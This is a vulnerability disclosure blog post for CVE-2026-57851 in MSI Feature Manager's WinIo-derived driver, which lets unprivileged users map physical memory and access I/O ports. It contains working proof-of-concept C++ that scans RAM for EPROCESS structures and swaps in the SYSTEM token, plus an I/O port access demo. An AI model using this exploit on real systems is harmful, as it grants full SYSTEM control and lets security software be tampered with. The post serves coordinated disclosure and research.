+++
title = "CVE-2026–57851 — Exploiting MSI Feature Manager Driver: Physical Memory and I/O Port Abuse for Privilege Escalation"
date = 2026-07-07
+++

![msi_feature_manager_cve-1](/images/posts/msi_feature_manager_cve-1.png)

## Background

After spending the last several months studying Windows internals and driver development, I decided to apply what I learned to a real-world target. After dozens of hours reading through the work of other researchers, I found out that hardware utility software is often vulnerable by design. Following that, I decided to check random software on my laptop and stumbled upon MSI Feature Manager. It is the utility software used to switch between performance modes and change keyboard lighting. I started analyzing the driver component in a static analysis tool, and it didn't take long to realize that the IOCTL validation was flawed by design, giving me a way to read and write to (almost) all physical memory and I/O ports.

## Disclosure Timeline

- **12 May 2026:** Vendor notified of the vulnerability
- **19 May 2026:** Vendor acknowledged the vulnerability
- **17 June 2026:** Vendor shares the patched build with the vulnerable driver removed — Submitted to VulnCheck for CVE assignment (vendor is not a CNA)
- **7 July 2026:** CVE-2026–57851 assigned. ([https://www.cve.org/CVERecord?id=CVE-2026-57851](https://www.cve.org/CVERecord?id=CVE-2026-57851))

## Vulnerability Overview

The vulnerability lives in the driver component of the software, KernCoreLib64.sys, a driver that has been timestamped since way back in 2018. The driver is a custom variant of WinIo, a well known vulnerable driver. Although the developers did implement some extra validation checks, they weren't enough to secure the driver. The driver exposes specific IOCTL handlers that allow any local, unprivileged user to perform arbitrary read and write operations on physical memory and I/O ports. While the physical memory access is restricted to addresses >=3.94GB (0xFC000800), critical kernel components such as ntoskrnl.exe are frequently resident in memory regions above this boundary. This can lead to full local privilege escalation, DKOM, tampering of security software by directly patching kernel-mode callbacks and process structures. Furthermore, it can be leveraged to manually map custom unsigned kernel drivers if modern protections such as HVCI or VBS are off (which is planned to be covered in a future post). Access to I/O ports are completely unvalidated, making them fully accessible to any unprivileged process.

## Detailed Analysis of the Physical Memory Mapping Vulnerability

![msi_feature_manager_cve-2](/images/posts/msi_feature_manager_cve-2.png)

The imports looked promising. I knew ZwMapViewOfSection was commonly used to map a view of the \Device\PhysicalMemory object, so I immediately went to analyze how the driver handled it.

![msi_feature_manager_cve-3](/images/posts/msi_feature_manager_cve-3.png)

Above is the IOCTL dispatch function. I restructured the pseudo-code and commented the important code to illustrate the logic. The driver handles physical memory mapping requests via the IOCTL 0x80102040, which is designated for mapping physical memory into user space. The driver implements a strict bound check on the requested physical address. It checks whether the target address falls within the ranges 0xFC000800 – 0xFC0008FF or 0xFC000E00 – 0xFC000FFF. If the request is outside these boundaries, the IOCTL call returns with an error. While this check looks sufficient at first look, a dive inside the map_phys_memory function shows an exploitation primitive. As we must be in the boundaries to reach this function, our best choice is to supply 0xFC000800 as the base physical address.

![msi_feature_manager_cve-4](/images/posts/msi_feature_manager_cve-4.png)

Once the IOCTL handler is triggered, execution flows into the map_phys_memory function. It obtains a handle to the \Device\PhysicalMemory object, which is a Windows kernel section object that provides a way to map the entire pool of physical memory available on the system. Historically, this section object used to be accessible directly from user-mode. Starting with Windows Server 2003 SP1, Microsoft then restricted it to kernel-mode only.

![msi_feature_manager_cve-5](/images/posts/msi_feature_manager_cve-5.png)

The continuation of the function handles the mapping of physical memory into the calling process's address space. The core of the vulnerability lies within 7th parameter of ZwMapViewOfSection API.

![msi_feature_manager_cve-6](/images/posts/msi_feature_manager_cve-6.png)

![msi_feature_manager_cve-7](/images/posts/msi_feature_manager_cve-7.png)

The driver does not validate this parameter before passing it to the kernel routine. By supplying a large enough value for the 7th parameter ViewSize (the maximum physical memory address minus 0xFC000800 in our case) , the caller can specify a range to map the system's entire physical memory above 0xFC000800 (>=3.94GB). As the Windows kernel (ntoskrnl.exe) and the important structures are almost always resident above this limit, an attacker gains the capability to overwrite important kernel structures, patch kernel code on the fly, and achieve kernel-level code execution directly from user mode.

## Proof of Concept: Leveraging Physical Memory Access for Process Token Manipulation

Below is a brief walkthrough highlighting the core logic of the exploit implementation to achieve full control over the OS by granting a user-mode process system level permissions (NT AUTHORITY\SYSTEM). For the complete source code, refer to the repository:

[MSI_FeatureManager_CVE/phys_mem/phys_mem.cpp at master · readmsr/MSI_FeatureManager_CVE](https://github.com/readmsr/MSI_FeatureManager_CVE/blob/master/phys_mem/phys_mem.cpp)

Obtaining the driver handle:

```cpp,linenos
HANDLE driver_handle = CreateFileW(L"\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, 3, nullptr, 3, FILE_ATTRIBUTE_NORMAL, nullptr);
if (driver_handle == INVALID_HANDLE_VALUE)
{
    std::cout << "[-] Failed to grab driver handle.\n";
    std::cout << "[*] Press enter to exit.\n";
    std::cin.get();
    return 1;
}
std::cout << "[+] Grabbed driver handle.\n\n";
```

Retrieving the total size of installed physical memory, falling back to 8GB if an error occurs.

```cpp,linenos
ULONGLONG total_ram_kb = 0;
DWORD64 map_size = EIGHT_GB;
if (GetPhysicallyInstalledSystemMemory(&total_ram_kb))
{
    map_size = total_ram_kb * 1024;
    std::cout << "[*] Physical RAM: " << std::dec << (total_ram_kb / (1024 * 1024)) << " GB (0x" << std::hex << map_size << " bytes)\n";
}
else
{
    std::cout << "[-] Failed to get physical RAM size. Defaulting 8 GB.\n";
}
```

Once the vulnerable IOCTL triggers the map_phys_memory function, the exploit below maps the entire available physical memory into our user-mode virtual address space by abusing the driver's lack of argument validation. From there, it initiates a sequential physical memory walk, scanning the RAM in 8-byte increments to hunt for EPROCESS structures. The exploit filters valid structure candidates through heuristic validations. These validations confirm the structure's validity by verifying requirements such as valid kernel address boundaries and a page-aligned CR3 directory base. Whenever uninitialized physical memory holes trigger an exception, the exploit catches and rounds the offset to the next page boundary. As the exploit scans, it prints out the details for every discovered process and filters the physical memory addresses of the current user process and PID 4 (System) which are needed for the token-stealing primitive.

```cpp,linenos
map_request read_req{};
read_req.size = map_size - PHYSICAL_READ_BASE; // ZwMapViewOfSection argument 7. no checks in the driver. can be used to map entire physical memory
read_req.phys_addr = PHYSICAL_READ_BASE; // lowest address in driver bound check
std::cout << "[*] Requesting memory map.\n";
DWORD bytes = 0;
if (DeviceIoControl(driver_handle, IOCTL_MAP_PHYS_MEM, &read_req, sizeof(map_request), &read_req, sizeof(map_request), &bytes, NULL))
{
    DWORD64 map_base_va = read_req.section_base_va;
    if (map_base_va)
    {
        std::cout << "[+] Map base VA found at 0x" << std::hex << map_base_va << ". Starting physical memory walk.\n\n";
        int found_count = 0;
        DWORD64 end_offset = map_size - PHYSICAL_READ_BASE;
        for (DWORD64 offset = 0; offset < end_offset; offset += 8) // physical memory walk
        {
            DWORD64 current_mapped_va = map_base_va + offset;
            __try
            {
                DWORD64 pid = *(volatile DWORD64*)current_mapped_va;
                if (pid >= 4 && pid <= 0xA0000 && (pid % 4 == 0)) // check if pid is valid and multiple of 4
                {
                    DWORD64 eprocess_base = current_mapped_va - EPROCESS_UNIQUEPID_OFFSET;
                    DWORD64 exit_time = read<DWORD64>(eprocess_base + EPROCESS_EXITTIME_OFFSET);
                    if (exit_time) continue; // if ExitTime != 0, the process has been terminated
                    DWORD64 create_time = read<DWORD64>(eprocess_base + EPROCESS_CREATETIME_OFFSET);
                    if (create_time < TIMESTAMP_MIN || create_time > TIMESTAMP_MAX) continue; // check if CreateTime isn't in valid bounds
                    DWORD64 flink = read<DWORD64>(eprocess_base + EPROCESS_ACTIVELINKS_OFFSET);
                    if ((flink & 0xFFFF000000000000) != 0xFFFF000000000000) continue; // check if next list entry is not in valid kernel address space
                    DWORD64 token = read<DWORD64>(eprocess_base + EPROCESS_TOKEN_OFFSET);
                    if ((token & 0xFFFF000000000000) != 0xFFFF000000000000) continue; // check if token is not in valid kernel address space
                    DWORD64 dir_base = read<DWORD64>(eprocess_base + KPROCESS_DIRECTORYTABLEBASE_OFFSET);
                    if (dir_base == 0 || (dir_base & 0xFFF) != 0 || (dir_base & 0xFFFF000000000000) != 0) continue; // check if cr3 is valid
                    char first_char = read<char>(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
                    if (first_char < 32 || first_char > 126) continue; // check if ImageFileName is valid
                    // passed validation checks, found eprocess
                    found_count++;
                    DWORD64 eprocess_phys_address = (PHYSICAL_READ_BASE + offset) - EPROCESS_UNIQUEPID_OFFSET;
                    DWORD64 process_virtual_base = read<DWORD64>(eprocess_base + EPROCESS_BASEADDRESS_OFFSET);
                    std::cout << "[*] PID: " << std::dec << pid << " ";
                    print_process_name(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
                    std::cout << "EPROCESS Phys: 0x" << std::hex << eprocess_phys_address << " ";
                    std::cout << "Base VA: 0x" << std::hex << process_virtual_base << "\n";
                    if (pid == current_proc.pid && !found_target)
                    {
                        current_proc.eprocess_phys = eprocess_phys_address;
                        current_proc.eprocess_va = eprocess_base;
                        current_proc.token = token;
                        found_target = true;
                    }
                    if (pid == 4 && !found_system)
                    {
                        system_proc.eprocess_phys = eprocess_phys_address;
                        system_proc.eprocess_va = eprocess_base;
                        system_proc.token = token;
                        found_system = true;
                    }
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) // ***this will throw exceptions. they must be ignored or the process should be launched without a debugger***
            {
                // jump to next page if we hit a hole
                offset = (offset & ~0xFFFULL) + 0x1000 - 8;
            }
        }
        std::cout << "[+] Completed physical memory walk. Found " << std::dec << found_count << " processes.\n\n";
    }
    else
    {
        std::cout << "[-] Map base VA not found.\n";
    }
}
else
{
    std::cout << "[-] Failed to retrieve map base VA.\n";
    std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
    CloseHandle(driver_handle);
    std::cin.get();
    return 1;
}
if (!found_system)
{
    std::cout << "[-] System process not found.\n";
    std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
    CloseHandle(driver_handle);
    std::cin.get();
    return 1;
}
if (!found_target)
{
    std::cout << "[-] Current process not found. Try again.\n";
    std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
    CloseHandle(driver_handle);
    std::cin.get();
    return 1;
}
```

If the physical memory addresses for both target processes are successfully found, the exploit prints the initial privilege context before executing the token stealing primitive by directly overwriting kernel memory. It replaces the Token field in the current process's EPROCESS structure with the token reference belonging to PID 4 (System). To verify that the Token swap succeeded, the exploit executes a read operation against the modified Token field. Once the target process's token matches the system token address, the process operates with full NT AUTHORITY\SYSTEM permissions. In the Windows security model, this represents the highest possible user-mode privilege on the local machine. This context grants extensive control over the operating system, allowing it to bypass most local access control policies, access sensitive credentials, and interact with critical security components that are inaccessible to standard users.

```cpp,linenos
std::cout << "[*] Current privilege: ";
system("cmd.exe /c whoami");
std::cout << "[*] Current process token: " << std::hex << current_proc.token << "\n\n";
std::cout << "[*] System token: " << std::hex << system_proc.token << "\n";
std::cout << "[*] Stealing system token...\n\n";
if (write<DWORD64>(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET, system_proc.token))
{
    DWORD64 verify = read<DWORD64>(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET);
    if (verify == system_proc.token)
    {
        std::cout << "[+] System token is stolen.\n";
        std::cout << "[*] New process token: " << std::hex << verify << "\n";
    }
    else
    {
        std::cout << "[-] Token stealing failed.\n";
        CloseHandle(driver_handle);
        std::cin.get();
        return 1;
    }
}
std::cout << "[*] New privilege: ";
system("cmd.exe /c whoami");
```

## Results

![msi_feature_manager_cve-8](/images/posts/msi_feature_manager_cve-8.png)

## Detailed Analysis of the Arbitrary I/O Port Read and Write Vulnerability

Unlike the physical memory mapping handler that at least attempted to enforce some boundaries, the driver's I/O port handlers have absolutely zero input validation. Because there are no security checks restricting which ports can be accessed, this vulnerability is incredibly easy to identify with static analysis.

![msi_feature_manager_cve-9](/images/posts/msi_feature_manager_cve-9.png)

![msi_feature_manager_cve-10](/images/posts/msi_feature_manager_cve-10.png)

The driver exposes direct wrappers around the `__in` and `__out` assembly instructions. Any local, unprivileged application can send an IOCTL request specifying any hardware port on the system, allowing completely unrestricted I/O port read and write primitives.

## Proof of Concept: Utilizing I/O Port Access for Hardware Chipset Identification

Below is a brief walkthrough highlighting the core logic of the implementation to demonstrate how the driver's unvalidated IOCTL handlers can be utilized to directly interface with I/O ports. Unlike the previous token manipulation section, this code does not execute an exploit. Instead, it serves as a proof of utilizing arbitrary I/O port access from an unprivileged process. For the complete source code, refer to the repository:

[MSI_FeatureManager_CVE/io_port/io_port.cpp at master · readmsr/MSI_FeatureManager_CVE](https://github.com/readmsr/MSI_FeatureManager_CVE/blob/master/io_port/io_port.cpp)

Obtaining driver handle:

```cpp,linenos
HANDLE driver_handle = CreateFileW(L"\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, 3, nullptr, 3, FILE_ATTRIBUTE_NORMAL, nullptr);
if (driver_handle == INVALID_HANDLE_VALUE)
{
    std::cout << "Failed to grab driver handle.\n";
    std::cin.get();
    return 1;
}
std::cout << "Grabbed driver handle.\n\n";
```

Setting the specific bitmask to Bus, Device, Function, and Register Offset bits at 0, the location of the chipset's Vendor and Device ID registers and sending an IOCTL request to configure the address to write:

```cpp,linenos
// Bit 31: Enable Bit (Must be 1)
// Bits 23-16: Bus Number (0)
// Bits 15-11: Device Number (0)
// Bits 10-8: Function Number (0)
// Bits 7-2: Register Offset (0x00 for Vendor/Device ID)
// Result: 0x80000000
unsigned int pci_address = 0x80000000;
port_write_request write_req = { 0xCF8, pci_address, 4 }; // CONFIG_ADDRESS
DWORD bytes = 0;
if (!DeviceIoControl(driver_handle, IOCTL_WRITE_IO_PORT, &write_req, sizeof(port_write_request), nullptr, 0, &bytes, nullptr))
{
    std::cout << "Failed to write to 0xCF8.\n";
    CloseHandle(driver_handle);
    return 1;
}
```

Once the target hardware address is locked to port 0xCF8, the chipset makes that device's data available on port 0xCFC (CONFIG_DATA). To read it, the process targets port 0xCFC and sends an IOCTL request, specifying the variable pci_data to catch the incoming data. Then the process performs some basic bit-shift operations to isolate the Vendor and Device ID's and prints the detected chipset on the console.

```cpp,linenos
port_read_request read_req = { 0xCFC, 0, 0, 4 }; // CONFIG_DATA
DWORD pci_data = 0;
if (!DeviceIoControl(driver_handle, IOCTL_READ_IO_PORT, &read_req, sizeof(port_read_request), &pci_data, sizeof(DWORD), &bytes, nullptr))
{
    std::cout << "Failed to read from 0xCFC.\n";
    CloseHandle(driver_handle);
    return 1;
}
unsigned short vendor_id = pci_data & 0xFFFF;
unsigned short device_id = (pci_data >> 16) & 0xFFFF;
std::cout << "Successfully read Bus 0, Device 0, Function 0\n\n";
std::cout << "Raw 32-bit data: 0x" << std::hex << pci_data << "\n";
std::cout << "Vendor ID: 0x" << std::hex << vendor_id << "\n";
std::cout << "Device ID: 0x" << std::hex << device_id << "\n\n";
if (vendor_id == 0x8086)
    std::cout << "Intel chipset detected.\n";
else if (vendor_id == 0x1022)
    std::cout << "AMD chipset detected.\n";
else
    std::cout << "Unknown vendor.\n";
std::cout << "Press enter to exit.";
CloseHandle(driver_handle);
std::cin.get();
return 0;
```

## Results

![msi_feature_manager_cve-11](/images/posts/msi_feature_manager_cve-11.png)
